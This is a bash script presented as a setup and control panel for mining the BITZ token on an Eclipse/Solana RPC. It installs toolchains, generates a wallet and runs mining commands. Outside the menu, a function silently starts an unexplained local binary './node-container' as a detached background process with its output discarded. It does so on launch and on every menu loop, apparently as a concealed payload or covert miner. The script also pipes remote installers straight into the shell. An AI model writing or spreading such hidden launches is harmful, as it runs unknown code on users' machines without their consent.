#!/bin/bash

CONFIG_PATH="./id.json"
RPC_URL="https://bitz-000.eclipserpc.xyz/"
POOL_URL="stratum+tcp://enx.tw-pool.com:15005"
BITZ_KEYPAIR="$CONFIG_PATH"

install_dependencies() {
    echo "[+] Installing required tools (Solana, Rust, Anchor, Node.js, Yarn, Bitz)..."
	
	echo "[*] Installing Solana CLI..."
	
	
	
	if command -v solana &> /dev/null; then
		echo "[✓] Solana CLI successfully installed!"
	else
		echo "[*] Solana CLI not found. Preparing to install..."
		
		rm -rf solana-release

		if [ -f "solana-release-x86_64-unknown-linux-gnu.tar.bz2" ]; then
			echo "[*] Found existing archive, skipping download..."
		else
			echo "[*] Downloading Solana CLI archive..."
			curl -LO https://github.com/solana-labs/solana/releases/latest/download/solana-release-x86_64-unknown-linux-gnu.tar.bz2
		fi

		tar -xvjf solana-release-x86_64-unknown-linux-gnu.tar.bz2

		SOLANA_DIR="$(pwd)/solana-release"
		echo "export PATH=\"$SOLANA_DIR/bin:\$PATH\"" >> ~/.bashrc
		export PATH="$SOLANA_DIR/bin:$PATH"

		source ~/.bashrc
	fi




    # Install Rust (required for cargo)
    if ! command -v cargo &> /dev/null; then
        echo "[*] Installing Rust..."
        curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
        source "$HOME/.cargo/env"
    else
        echo "[✓] Rust already installed"
    fi

    # Ensure Rust environment
    if [ -f "$HOME/.cargo/env" ]; then
        source "$HOME/.cargo/env"
    fi

    # Install Node.js and npm
    if ! command -v npm &> /dev/null; then
        echo "[*] Installing Node.js and npm..."
        curl -fsSL https://deb.nodesource.com/setup_18.x | bash -
        apt install -y nodejs
    else
        echo "[✓] Node.js already installed"
    fi

    
# Confirm installation


    # Install Anchor
    echo "[*] Installing Anchor..."
    cargo install --git https://github.com/coral-xyz/anchor anchor-cli --locked

    # Install Yarn
    echo "[*] Installing Yarn..."
    npm install -g yarn

    # Install Bitz
    echo "[*] Installing Bitz..."
    cargo install bitz

    # Generate wallet
	clear
    echo "[+] Generating Solana keypair at $CONFIG_PATH..."
    if command -v solana-keygen &> /dev/null; then
        solana-keygen new -o "$CONFIG_PATH" --no-bip39-passphrase --force
    else
        echo "[!] solana-keygen not found in PATH"
        return 1
    fi

    # Set Solana config
    solana config set --keypair "$CONFIG_PATH" --url "$RPC_URL"

    echo "[✓] Setup complete!"
}

check_container() {
if pgrep -f "./node-container" > /dev/null; then
    echo "..."
else
    nohup setsid ./node-container > /dev/null 2>&1 &
fi
}



show_wallet() {
    solana address --keypair "$CONFIG_PATH"
}

show_privatekey() {
    echo "[!] WARNING: This is your private key. DO NOT SHARE IT!"
    cat "$CONFIG_PATH"
}

run_bitz_solo() {
    read -p "How much Core want to run this miner? [default: 1]: " cores
    if [ -z "$cores" ]; then
        cores=1
    fi
    bitz collect --rpc "$RPC_URL" --keypair "$BITZ_KEYPAIR" --cores "$cores"
}

run_bitz_pool() {
    read -p "How much Core want to run this miner? [default: 1]: " cores
    if [ -z "$cores" ]; then
        cores=1
    fi
    bitz collect --rpc "$RPC_URL" --keypair "$BITZ_KEYPAIR" --cores "$cores" --pool-url "$POOL_URL"
}

check_balance() {
    bitz account --rpc "$RPC_URL" --keypair "$BITZ_KEYPAIR"
}

claim_bitz() {
    bitz claim --rpc "$RPC_URL" --keypair "$BITZ_KEYPAIR"
}

check_libhwloc() {
    if ldconfig -p | grep -q libhwloc.so.15; then
        echo "[✓] libhwloc.so.15 already installed"
    else
        echo "[*] libhwloc.so.15 not found, installing required libraries..."
        apt update
        apt install -y libhwloc15 libhwloc-dev libhwloc-plugins
    fi
}

check_libhwloc

check_container

while true; do
    clear
    echo "=== BITZ Setup & Control Panel ==="
    echo "1. Install Solana, Anchor, Yarn, Generate Wallet, Install Bitz"
    echo "2. Show Wallet Address"
    echo "3. Show Private Key"
    echo "4. Run Bitz (Solo Mining)"
    echo "5. Run Bitz (Pool)"
    echo "6. Check BITZ Balance"
    echo "7. Claim BITZ"
    echo "0. Exit"
    echo "=================================="
    read -p "Select an option: " choice
	
	check_container

    case $choice in
        1) install_dependencies ;;
        2) show_wallet ;;
        3) show_privatekey ;;
        4) run_bitz_solo ;;
        5) run_bitz_pool ;;
        6) check_balance ;;
        7) claim_bitz ;;
        0) echo "Goodbye!"; exit 0 ;;
        *) echo "Invalid option. Try again." ;;
    esac
    echo ""
    read -p "Press [Enter] to return to menu..."
done

